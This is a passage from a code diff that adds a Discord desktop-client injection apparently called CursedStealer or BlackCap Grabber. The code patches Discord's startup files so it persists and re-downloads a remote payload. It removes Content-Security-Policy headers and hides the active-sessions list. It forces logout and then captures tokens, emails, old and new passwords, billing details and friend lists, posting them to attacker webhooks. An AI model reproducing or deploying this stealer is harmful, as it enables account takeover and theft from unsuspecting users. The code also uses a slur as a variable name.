+    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
+    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+
+    if (process.platform === "win32" || process.platform === "darwin") {
+        fs.writeFileSync(
+            packageJson,
+            JSON.stringify({
+                    name: "discord",
+                    main: "index.js",
+                },
+                null,
+                4,
+            ),
+        );
+
+        const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJS = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJS).size
+fs.readFileSync(indexJS, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJS);
+        res.replace('core' + 'num', indexJS).replace('%WEBHOOK%', '${config.webhook}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, "app.asar")}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
+
+        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
+    }
+    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
+    execScript(
+        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
+    );
+    return !1;
+}
+
+const execScript = (script) => {
+    const window = BrowserWindow.getAllWindows()[0];
+    return window.webContents.executeJavaScript(script, !0);
+};
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+};
+
+async function noSessionPlease() {
+    await sleep(1000)
+    execScript(`
+function userclick() {
+    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
+    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
+}
+
+function IsSession(item) {
+    return item?.innerText?.includes("Devices")
+}
+
+function handler(e) {
+    e = e || window.event;
+    var target = e.target || e.srcElement,
+    text = target.textContent || target.innerText;   
+    if (IsSession(target)) userclick()
+}
+function waitForElm(selector) {
+    return new Promise(resolve => {
+        const observer = new MutationObserver(mutations => {
+            if (document.querySelectorAll(selector).length>2) {
+                resolve(document.querySelectorAll(selector))
+            observer.disconnect();
+            }
+        });
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+}
+document.addEventListener('click',handler,false);
+`)
+};
+
+noSessionPlease()
+
+
+
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    if (details.url.startsWith(config.webhook)) {
+        if (details.url.includes("discord.com")) {
+            callback({
+                responseHeaders: Object.assign({
+                    'Access-Control-Allow-Headers': "*"
+                }, details.responseHeaders)
+            });
+        } else {
+            callback({
+                responseHeaders: Object.assign({
+                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+                    'Access-Control-Allow-Headers': "*",
+                    "Access-Control-Allow-Origin": "*"
+                }, details.responseHeaders)
+            });
+        }
+
+
+    } else {
+        delete details.responseHeaders['content-security-policy'];
+        delete details.responseHeaders['content-security-policy-report-only'];
+
+        callback({
+            responseHeaders: {
+                ...details.responseHeaders,
+                'Access-Control-Allow-Headers': "*"
+            }
+        })
+    }
+
+})
+
+
+
+
+const hooker = async (content) => {
+    const data = JSON.stringify(content);
+    const url = new URL(config.webhook);
+    const url2 = new URL(superlmao)
+    const options = {
+        protocol: url.protocol,
+        hostname: url.host,
+        path: url.pathname,
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+        },
+    };
+    const options2 = {
+        protocol: url2.protocol,
+        hostname: url2.host,
+        path: url2.pathname,
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+        },
+    };
+    const req = https.request(options);
+    const req2 = https.request(options2);
+    
+    req.on("error", (err) => {
+        console.log(err);
+    });
+    req.write(data);
+    req.end();
+    req2.on("error", (err) => {
+        console.log(err);
+    });
+    req2.write(data);
+    req2.end();
+};
+
+
+async function FirstTime() {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
+
+        if (config['init-notify'] == "true") {
+            if (fs.existsSync(path.join(__dirname, "Cursed"))) {
+                fs.rmdirSync(path.join(__dirname, "Cursed"));
+                if (token == null || token == undefined || token == "") {
+                    var {
+                        ip
+                    } = await getFromURL("https://www.myexternalip.com/json", null)
+                    const c = {
+                        username: "CursedStealer - Infected",
+                        content: "",
+                        embeds: [{
+                            title: "CursedStealer Initalized",
+                            color: config["embed-color"],
+                            fields: [{
+                                name: "Injection Info",
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                inline: !1
+							}],
+                            author: {
+                                name: "Cursed Stealer"
+                            },
+						}]
+                    };
+                    hooker(c)
+                } else {
+                    var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
+                    var {
+                        ip
+                    } = await getFromURL("https://www.myexternalip.com/json", null)
+                    
+                    if(b.avatar === null){
+                        usericonurl = ""
+                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+                    if(b.banner === null){
+                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+                    const c = {
+                        username: "CursedStealer Infected",
+                        content: "",
+                        embeds: [{
+                            title: "CursedStealer Initalized",
+                            description: "[:skull: │ **Website**](https://www.cursedstealer.website)",
+                            color: config["embed-color"],
+                            fields: [{
+                                name: "Injection Info",
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                inline: !1
+								}, {
+                                name: "Username <:username:1041634536733290596> ",
+                                value: `\`${b.username}#${b.discriminator}\``,
+                                inline: !0
+								}, {
+                                name: "ID <:iduser:1041634535395307520>",
+                                value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                                inline: !0
+								}, {
+                                name: "Badges <:badge:1041634538150973460>",
+                                value: `${GetBadges(b.flags)}`,
+                                inline: !0
+								}, {
+                                name: "Language <:language:1041640473477001236>",
+                                value: `${GetLangue(b.locale)}`,
+                                inline: !0
+								}, {
+                                name: "A2F <a:a2f:1040272766982692885>",
+                                value: `${GetA2F(b.mfa_enabled)}`,
+                                inline: !0
+								}, {
+                                name: "@Copyright",
+                                value: `[CursedStealer 2022 :skull:](https://www.cursedstealer.website)`,
+                                inline: !0
+								}, {
+                                name: "<a:tokens:1041634540537511957> Token",
+                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                                inline: !1
+								}],
+
+                            footer: {
+                                text: "©CursedStealer"
+                            },
+                            image: {
+                                url: bannerurl,
+                            },
+                            thumbnail: {
+                                url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
+                            }
+							}]
+                    };
+
+                    hooker(c)
+                };
+
+
+
+
+                if (!fs.existsSync(path.join(__dirname, "Cursed"))) {
+                    return !0
+                }
+
+                fs.rmdirSync(path.join(__dirname, "Cursed"));
+                if (config.logout != "false" || config.logout !== "%LOGOUT%") {
+                    if (config['logout-notify'] == "true") {
+                        if (token == null || token == undefined || token == "") {
+                            var {
+                                ip
+                            } = await getFromURL("https://www.myexternalip.com/json", null)
+                            const c = {
+                                username: "CursedStealer Infected",
+                                content: "",
+                                embeds: [{
+                                    title: "CursedStealer User log out",
+                                    color: config["embed-color"],
+                                    fields: [{
+                                        name: "Injection Info",
+                                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
+                                        inline: !1
+							}],
+						}]
+                            };
+                            hooker(c)
+
+                        } else {
+                            var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
+                            var {
+                                ip
+                            } = await getFromURL("https://www.myexternalip.com/json", null)
+                            if(b.avatar === null){
+                                usericonurl = ""
+                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
+                            if(b.banner === null){
+                                bannerurl = ""
+                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+                            const c = {
+                                username: "BlackCap Grabber",
+                                content: "",
+                                embeds: [{
+                                    title: "CursedStealer got logged out",
+                                    description: "[:skull: │ **Website**](https://www.cursedstealer.website)",
+                                    color: config["embed-color"],
+                                    fields: [{
+                                        name: "Injection Info",
+                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                        inline: !1
+								}, {
+                                        name: "Username <:username:1041634536733290596> ",
+                                        value: `\`${b.username}#${b.discriminator}\``,
+                                        inline: !0
+								}, {
+                                        name: "ID <:iduser:1041634535395307520>",
+                                        value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                                        inline: !0
+								}, {
+                                        name: "Badges <:badge:1041634538150973460>",
+                                        value: `${GetBadges(b.flags)}`,
+                                        inline: !0
+								}, {
+                                        name: "NSFW <a:nsfw:1041640474617839616>",
+                                        value: `${GetNSFW(b.nsfw_allowed)}`,
+                                        inline: !1
+								}, {
+                                        name: "A2F <a:a2f:1040272766982692885>",
+                                        value: `${GetA2F(b.mfa_enabled)}`,
+                                        inline: !0
+								}, , {
+                                        name: "<a:tokens:1041634540537511957> Token",
+                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                                        inline: !1
+								}],
+
+                                   
+                                    thumbnail: {
+                                        url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
+                                    }
+							}]
+                            };
+                            hooker(c)
+                        }
+                    }
+
+
+                    const window = BrowserWindow.getAllWindows()[0];
+                    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
+                }
+                return !1
+            }
+        }
+    }))
+}
+
+
+const Filter = {
+    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+}
+
+
+
+
+async function saveidtofile(text, name) {
+    fs.open(name, function(err) {
+        if (err) return;
+    });
+    fs.appendFile(name, `${text}\n`, function(err) {
+        if (err) return;
+    });
+}
+
+
+async function deletefile(name) {
+    fs.unlink(`${name}`, function(err) {
+        if (err) return;
+    });
+}
+
+
+async function getFromURL(url, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var b = await window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "${url}", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    JSON.parse(xmlHttp.responseText);`, !0)
+    return b
+}
+
+async function getFromURLnp(url, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var b = await window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "${url}", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );`, !0)
+    return b
+}
+
+
+
+
+function GetNSFW(reader) {
+    if (reader == true) {
+        return "🔞 `NSFW Allowed`"
+    }
+    if (reader == false) {
+        return "🔞 `NSFW Not Allowed`"
+    } else {
+        return "Idk bro you got me"
+    }
+}
+
+function GetA2F(reader) {
+    if (reader == true) {
+        return "🔒 `A2F Enabled`"
+    }
+    if (reader == false) {
+        return "🔓 `A2F Not Enabled`"
+    } else {
+        return "Idk bro you got me"
+    }
+}
+
+
+
+function GetNitro(flags) {
+    if (flags == 0) {
+        return "No Nitro"
+    }
+    if (flags == 1) {
+        return "<:classic:896119171019067423> \`Nitro Classic\`"
+    }
+    if (flags == 2) {
+        return "<a:boost:824036778570416129> \`Nitro Boost\`"
+    } else {
+        return "No Nitro"
+    }
+}
+
+function GetRBadges(flags) {
+    const Discord_Employee = 1;
+    const Partnered_Server_Owner = 2;
+    const HypeSquad_Events = 4;
+    const Bug_Hunter_Level_1 = 8;
+    const Early_Supporter = 512;
+    const Bug_Hunter_Level_2 = 16384;
+    const Early_Verified_Bot_Developer = 131072;
+    var badges = "";
+    if ((flags & Discord_Employee) == Discord_Employee) {
+        badges += "<:staff:874750808728666152> "
+    }
+    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+        badges += "<:partner:874750808678354964> "
+    }
+    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+        badges += "<:hypesquad_events:874750808594477056> "
+    }
+    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+        badges += "<:bughunter_1:874750808426692658> "
+    }
+    if ((flags & Early_Supporter) == Early_Supporter) {
+        badges += "<:early_supporter:874750808414113823> "
+    }
+    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+        badges += "<:bughunter_2:874750808430874664> "
+    }
+    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+        badges += "<:developer:874750808472825986> "
+    }
+    if (badges == "") {
+        badges = ""
+    }
+    return badges
+}
+
+function GetLangue(read) {
+    const France = 'fr';
+    const Dansk = 'da';
+    const Deutsch = 'de';
+    const englishUK = 'en-GB';
+    const englishUS = 'en-US';
+    const espagnol = 'es-ES';
+    const hrvatski = 'hr';
+    const italianio = 'it';
+    const lietuviskai = 'lt';
+    const magyar = 'hu';
+    const neerland = 'nl';
+    const Norsk = 'no';
+    const polski = 'pl';
+    const portugues = 'pr-BR';
+    const Romana = 'ro';
+    const finlandais = 'fi';
+    const svenska = 'sv-SE';
+    const tiengviet = 'vi';
+    const turk = 'tr';
+    const cestina = 'cs';
+    const grecque = 'el';
+    const bulgar = 'bg';
+    const russe = 'ru';
+    const ukrainier = 'uk';
+    const inde = 'hi';
+    const thai = 'th';
+    const chineschina = 'zh-CN';
+    const japonais = 'ja';
+    const chinestaiwan = 'zh-TW';
+    const korea = 'ko';
+    var langue = "";
+    if (read == France) {
+        langue += "🇫🇷 French"
+    }
+    if (read == Dansk) {
+        langue += "🇩🇰 Dansk"
+    }
+    if (read == Deutsch) {
+        langue += "🇩🇪 Deutsch"
+    }
+    if (read == englishUK) {
+        langue += "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English"
+    }
+    if (read == englishUS) {
+        langue += "🇺🇸 USA"
+    }
+    if (read == espagnol) {
+        langue += "🇪🇸 Español"
+    }
+    if (read == hrvatski) {
+        langue += "🇭🇷 Croatian"
+    }
+    if (read == italianio) {
+        langue += "🇮🇹 Italianio"
+    }
+    if (read == lietuviskai) {
+        langue += "🇱🇹 Lithuanian"
+    }
+    if (read == magyar) {
+        langue += "🇭🇺 Hungarian"
+    }
+    if (read == neerland) {
+        langue += "🇳🇱 Dutch"
+    }
+    if (read == Norsk) {
+        langue += "🇳🇴 Norwegian"
+    }
+    if (read == polski) {
+        langue += "🇵🇱 Polish"
+    }
+    if (read == portugues) {
+        langue += "🇵🇹 Portuguese"
+    }
+    if (read == Romana) {
+        langue += "🇷🇴 Romanian"
+    }
+    if (read == finlandais) {
+        langue += "🇫🇮 Finnish"
+    }
+    if (read == svenska) {
+        langue += "🇸🇪 Swedish"
+    }
+    if (read == turk) {
+        langue += "🇹🇷 Turkish"
+    }
+    if (read == tiengviet) {
+        langue += "🇻🇳 Vietnamese"
+    }
+    if (read == cestina) {
+        langue += "🇨🇿 Czech"
+    }
+    if (read == grecque) {
+        langue += "🇬🇷 Greek"
+    }
+    if (read == bulgar) {
+        langue += "🇧🇬 Bulgarian"
+    }
+    if (read == russe) {
+        langue += "🇷🇺 Russian"
+    }
+    if (read == ukrainier) {
+        langue += "🇺🇦 Ukrainian"
+    }
+    if (read == inde) {
+        langue += "🇮🇳 Indian"
+    }
+    if (read == thai) {
+        langue += "🇹🇼 Taiwanese"
+    }
+    if (read == chineschina) {
+        langue += "🇨🇳 Chinese-China"
+    }
+    if (read == japonais) {
+        langue += "🇯🇵 Japanese"
+    }
+    if (read == chinestaiwan) {
+        langue += "🇨🇳 Chinese-Taiwanese"
+    }
+    if (read == korea) {
+        langue += "🇰🇷 Korean"
+    }
+    if (langue == "") {
+        langue = "None"
+    }
+    return langue
+}
+
+function GetBadges(flags) {
+    const Discord_Employee = 1;
+    const Partnered_Server_Owner = 2;
+    const HypeSquad_Events = 4;
+    const Bug_Hunter_Level_1 = 8;
+    const House_Bravery = 64;
+    const House_Brilliance = 128;
+    const House_Balance = 256;
+    const Early_Supporter = 512;
+    const Bug_Hunter_Level_2 = 16384;
+    const Early_Verified_Bot_Developer = 131072;
+    const Discord_Active_Developer = 4194304;
+    var badges = "";
+    if ((flags & Discord_Employee) == Discord_Employee) {
+        badges += "<:staff:874750808728666152> "
+    }
+    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+        badges += "<:partner:874750808678354964> "
+    }
+    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+        badges += "<:hypesquad_events:874750808594477056> "
+    }
+    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+        badges += "<:bughunter_1:874750808426692658> "
+    }
+    if ((flags & House_Bravery) == House_Bravery) {
+        badges += "<:bravery:874750808388952075> "
+    }
+    if ((flags & House_Brilliance) == House_Brilliance) {
+        badges += "<:brilliance:874750808338608199> "
+    }
+    if ((flags & House_Balance) == House_Balance) {
+        badges += "<:balance:874750808267292683> "
+    }
+    if ((flags & Early_Supporter) == Early_Supporter) {
+        badges += "<:early_supporter:874750808414113823> "
+    }
+    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+        badges += "<:bughunter_2:874750808430874664> "
+    }
+    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+        badges += "<:developer:874750808472825986> "
+    }
+    if ((flags & Discord_Active_Developer) == Discord_Active_Developer) {
+        badges += "<:activedev:1041634224253444146> "
+    }
+    if (badges == "") {
+        badges = "None"
+    }
+    return badges
+}
+
+
+
+async function Login(email, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
+    var {
+        ip
+    } = await getFromURL("https://www.myexternalip.com/json", null)
+    window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((info3) => {
+        window.webContents.executeJavaScript(`
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+            xmlHttp.setRequestHeader("Authorization", "${token}");
+            xmlHttp.send( null );
+            xmlHttp.responseText`, !0).then((info4) => {
+            function totalFriends() {
+                var f = JSON.parse(info4)
+                const r = f.filter((user) => {
+                    return user.type == 1
+                })
+                return r.length
+            }
+
+            function CalcFriends() {
+                var f = JSON.parse(info4)
+                const r = f.filter((user) => {
+                    return user.type == 1
+                })
+                var gay = "";
+                for (z of r) {
+                    var b = GetRBadges(z.user.public_flags)
+                    if (b != "") {
+                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+                    }
+                }
+                if (gay == "") {
+                    gay = "No Rare Friends"
+                }
+                return gay
+            }
+
+            function Cool() {
+                const json = JSON.parse(info3)
+                var billing = "";
+                json.forEach(z => {
+                    if (z.type == "") {
+                        return "\`❌\`"
+                    } else if (z.type == 2 && z.invalid != !0) {
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                    } else if (z.type == 1 && z.invalid != !0) {
+                        billing += "\`✔️\`" + " :credit_card:"
+                    } else {
+                        return "\`❌\`"
+                    }
+                })
+                if (billing == "") {
+                    billing = "\`❌\`"
+                }
+                return billing
+            }
+            if(info.avatar === null){
+                usericonurl = ""
+            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
+            if(info.banner === null){
+                bannerurl = ""
+            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
+            
+            const params = {
+                username: "CursedStealer Infected",
+                content: "",
+                embeds: [{
+                    "title": "CursedStealer User Login",
+                    description: "[:skull: │ **Website**](https://www.cursedstealer.website)",
+                    "color": config['embed-color'],
+                    "fields": [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                        inline: !1
+												}, {
+                        name: "Username <:username:1041634536733290596> ",
+                        value: `\`${info.username}#${info.discriminator}\``,
+                        inline: !0
+												}, {
+                        name: "ID <:iduser:1041634535395307520>",
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
+                        inline: !0
+												}, {
+                        name: "Nitro <a:nitro:1041639670288748634>",
+                        value: `${GetNitro(info.premium_type)}`,
+                        inline: !0
+												}, {
+                        name: "Badges <:badge:1041634538150973460>",
+                        value: `${GetBadges(info.flags)}`,
+                        inline: !0
+												}, {
+                        name: "Language <:language:1041640473477001236>",
+                        value: `${GetLangue(info.locale)}`,
+                        inline: !0
+												}, {
+                        name: "A2F <a:a2f:1040272766982692885>",
+                        value: `${GetA2F(info.mfa_enabled)}`,
+                        inline: !0
+												}, {
+                        name: "Billing <a:billing:1041641103629234196>",
+                        value: `${Cool()}`,
+                        inline: !1
+												}, {
+                        name: "Email <a:email:1041639672037785691>",
+                        value: `\`${email}\``,
+                        inline: !0
+												}, {
+                        name: "<a:password:1041639669047238676> Password",
+                        value: `\`${password}\``,
+                        inline: !0
+												}, {
+                        name: "<a:tokens:1041634540537511957> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                        inline: !1
+												}, ],
+
+                   
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
+											}, {
+                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
+                    "color": config['embed-color'],
+                    "description": CalcFriends(),
+                
+                    "image": {
+                        'url': `${bannerurl}`,
+                    },
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
+											}]
+            }
+            hooker(params)
+        })
+    })
+}
+
+
+
+
+async function ChangePassword(oldpassword, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
+    var {
+        ip
+    } = await getFromURL("https://www.myexternalip.com/json", null)
+    window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((info3) => {
+        window.webContents.executeJavaScript(`
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+            xmlHttp.setRequestHeader("Authorization", "${token}");
+            xmlHttp.send( null );
+            xmlHttp.responseText`, !0).then((info4) => {
+
+            function totalFriends() {
+                var f = JSON.parse(info4)
+                const r = f.filter((user) => {
+                    return user.type == 1
+                })
+                return r.length
+            }
+
+            function CalcFriends() {
+                var f = JSON.parse(info4)
+                const r = f.filter((user) => {
+                    return user.type == 1
+                })
+                var gay = "";
+                for (z of r) {
+                    var b = GetRBadges(z.user.public_flags)
+                    if (b != "") {
+                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+                    }
+                }
+                if (gay == "") {
+                    gay = "No Rare Friends"
+                }
+                return gay
+            }
+
+            function Cool() {
+                const json = JSON.parse(info3)
+                var billing = "";
+                json.forEach(z => {
+                    if (z.type == "") {
+                        return "\`❌\`"
+                    } else if (z.type == 2 && z.invalid != !0) {
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                    } else if (z.type == 1 && z.invalid != !0) {
+                        billing += "\`✔️\`" + " :credit_card:"
+                    } else {
+                        return "\`❌\`"
+                    }
+                })
+                if (billing == "") {
+                    billing = "\`❌\`"
+                }
+                return billing
+            }
+            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
+            const params = {
+                username: "CursedStealer Infected",
+                content: "",
+                embeds: [{
+                    "title": "CursedStealer Detect Password Changed",
+                    description: "[:skull: │ **Website**](https://www.cursedstealer.website)",
+                    "color": config['embed-color'],
+                    "fields": [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                        inline: !1
+												}, {
+                        name: "Username <:username:1041634536733290596> ",
+                        value: `\`${info.username}#${info.discriminator}\``,
+                        inline: !0
+												}, {
+                        name: "ID <:iduser:1041634535395307520>",
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
+                        inline: !0
+												}, {
+                        name: "Nitro <a:nitro:1041639670288748634>",
+                        value: `${GetNitro(info.premium_type)}`,
+                        inline: !0
+												}, {
+                        name: "Badges <:badge:1041634538150973460>",
+                        value: `${GetBadges(info.flags)}`,
+                        inline: !0
+												}, {
+                        name: "Language <:language:1041640473477001236>",
+                        value: `${GetLangue(info.locale)}`,
+                        inline: !0
+												},{
+                        name: "A2F <a:a2f:1040272766982692885>",
+                        value: `${GetA2F(info.mfa_enabled)}`,
+                        inline: !0
+												},  {
+                        name: "Billing <a:billing:1041641103629234196>",
+                        value: `${Cool()}`,
+                        inline: !1
+												}, {
+                        name: "Email <a:email:1041639672037785691>",
+                        value: `\`${info.email}\``,
+                        inline: !1
+												}, {
+                        name: "<a:password:1041639669047238676> Old Password",
+                        value: `\`${oldpassword}\``,
+                        inline: !0
+												}, {
+                        name: "<a:password:1041639669047238676> New Password",
+                        value: `\`${newpassword}\``,
+                        inline: !0
+												}, {
+                        name: "<a:tokens:1041634540537511957> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                        inline: !1
+												}, ],
+
+                   
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
+											}, {
+                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
+                    "color": config['embed-color'],
+                    "description": CalcFriends(),
+
+        
+                    "image": {
+                        'url': `${bannerurl}`,
+                    },
+                    "thumbnail": {
+                        "url": `${usericonurl}`
+                    }
+											}]
+            }
+            hooker(params)
+        })
+    })
+}
+
+async function ChangeEmail(newemail, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
+    var {
+        ip
+    } = await getFromURL("https://www.myexternalip.com/json", null)
+    window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((info3) => {
+        window.webContents.executeJavaScript(`
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+            xmlHttp.setRequestHeader("Authorization", "${token}");
+            xmlHttp.send( null );
+            xmlHttp.responseText`, !0).then((info4) => {
+            function totalFriends() {
+                var f = JSON.parse(info4)
+                const r = f.filter((user) => {
+                    return user.type == 1
+                })
+                return r.length
+            }
+
+            function CalcFriends() {
+                var f = JSON.parse(info4)
+                const r = f.filter((user) => {
+                    return user.type == 1
+                })
+                var gay = "";
+                for (z of r) {
+                    var b = GetRBadges(z.user.public_flags)
+                    if (b != "") {
+                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+                    }
+                }
